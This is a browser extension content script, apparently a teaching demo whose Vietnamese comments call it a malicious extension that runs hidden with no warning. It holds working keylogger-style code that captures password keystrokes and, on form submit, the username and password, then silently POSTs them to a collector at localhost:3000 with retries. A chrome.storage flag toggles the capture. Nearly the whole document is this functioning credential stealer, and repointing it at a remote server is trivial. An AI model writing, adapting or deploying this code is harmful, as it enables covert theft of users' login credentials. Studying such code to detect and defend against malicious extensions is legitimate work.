/**
 * Malicious Extension — Content Script
 * Hoạt động hoàn toàn ẩn, không có UI, không cảnh báo.
 * Đây là hành vi thực tế của extension độc hại.
 */
(function () {
  "use strict";

  async function sendCapture(event) {
    const MAX_ATTEMPTS = 3;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
      try {
        const res = await fetch("http://localhost:3000/capture", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(event),
        });
        if (res.ok) return;
      } catch (_) {}
    }
    // Silent fallback — attacker doesn't want to be noticed
  }

  let keyupHandler = null;
  let submitHandler = null;

  function attachListeners() {
    const passwordField = document.querySelector('input[type="password"]');
    if (!passwordField) return;

    // Keypress capture — completely silent
    keyupHandler = function () {
      const field = document.querySelector('input[type="password"]');
      if (!field) return;
      sendCapture({
        timestamp: new Date().toISOString(),
        url: window.location.href,
        type: "keypress",
        username: "",
        value: field.value,
      });
    };
    passwordField.addEventListener("keyup", keyupHandler);

    // Submit capture — grab both username and password
    submitHandler = function (e) {
      const form = e.target;
      const pwField = form ? form.querySelector('input[type="password"]') : document.querySelector('input[type="password"]');
      const userField = form ? form.querySelector('input[type="text"], input[type="email"]') : document.querySelector('input[type="text"], input[type="email"]');
      sendCapture({
        timestamp: new Date().toISOString(),
        url: window.location.href,
        type: "submit",
        username: userField ? userField.value : "",
        value: pwField ? pwField.value : "",
      });
    };
    document.addEventListener("submit", submitHandler);
  }

  function detachListeners() {
    const passwordField = document.querySelector('input[type="password"]');
    if (keyupHandler) {
      if (passwordField) passwordField.removeEventListener("keyup", keyupHandler);
      keyupHandler = null;
    }
    if (submitHandler) {
      document.removeEventListener("submit", submitHandler);
      submitHandler = null;
    }
  }

  function onStorageChange(changes) {
    if ("active" in changes) {
      changes["active"].newValue === true ? attachListeners() : detachListeners();
    }
  }

  if (typeof chrome !== "undefined" && chrome.storage) {
    chrome.storage.local.get("active", function (result) {
      if (result["active"] !== false) attachListeners();
    });
    chrome.storage.onChanged.addListener(onStorageChange);
  } else {
    attachListeners();
  }
})();
